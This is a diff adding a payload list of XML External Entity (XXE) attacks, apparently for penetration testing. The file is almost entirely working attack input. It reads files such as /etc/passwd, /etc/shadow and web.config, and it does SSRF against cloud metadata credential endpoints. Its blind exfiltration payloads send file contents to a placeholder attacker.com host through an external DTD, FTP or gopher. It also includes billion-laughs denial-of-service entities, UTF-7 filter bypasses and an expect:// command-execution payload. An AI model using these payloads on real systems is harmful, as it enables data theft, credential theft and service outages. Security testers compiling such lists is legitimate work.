@@ -1,0 +1,192 @@
+# XXE (XML External Entity) Payloads
+# For XML parsing vulnerabilities
+# Covers file read, SSRF, and blind XXE
+
+# Basic file read (Linux)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<data>&file;</data>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+<test>&xxe;</test>
+
+# Basic file read (Windows)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]>
+<foo>&xxe;</foo>
+
+# PHP filter (for reading PHP files as base64)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]>
+<foo>&xxe;</foo>
+
+# SSRF via XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>
+<foo>&xxe;</foo>
+
+# Blind XXE with external DTD
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<foo>&send;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<foo>&send;</foo>
+
+# evil.dtd content:
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
+# %eval;
+
+# Parameter entity XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<foo>&send;</foo>
+
+# Billion laughs (DoS) - Use carefully!
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>
+
+# Quadratic blowup (DoS)
+<?xml version="1.0"?>
+<!DOCTYPE kaboom [
+  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+]>
+<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>
+
+# XInclude (when you can't control DOCTYPE)
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="http://attacker.com/evil.xml"/>
+</root>
+
+# SVG XXE
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+
+# XLSX/DOCX XXE (in document.xml, styles.xml, etc.)
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<worksheet>&xxe;</worksheet>
+
+# SOAP XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <data>&xxe;</data>
+  </soap:Body>
+</soap:Envelope>
+
+# UTF-7 encoded XXE (bypass filters)
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
++ADw-foo+AD4-+ACY-xxe;+ADw-/foo+AD4-
+
+# UTF-16 encoded XXE
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# Error-based XXE (for blind scenarios)
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % error "<!ENTITY &#x25; oob SYSTEM 'file:///nonexistent/%file;'>">
+  %error;
+  %oob;
+]>
+<foo></foo>
+
+# FTP for data exfiltration
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/test">]>
+<foo>&xxe;</foo>
+
+# Gopher protocol
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://attacker.com:9999/_test">]>
+<foo>&xxe;</foo>
+
+# expect:// wrapper (if enabled)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+# data:// wrapper
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,dGVzdA==">]>
+<foo>&xxe;</foo>
+
+# jar:// protocol (Java)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/test.txt">]>
+<foo>&xxe;</foo>
+
+# netdoc:// protocol (Java)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# Detection payloads (minimal, check for response)
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe "test">]>
+<foo>&xxe;</foo>
+
+<!DOCTYPE test [<!ENTITY xxe "VULNERABLE">]>
+<test>&xxe;</test>
+
+# CDATA section exfiltration
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<foo>&all;</foo>
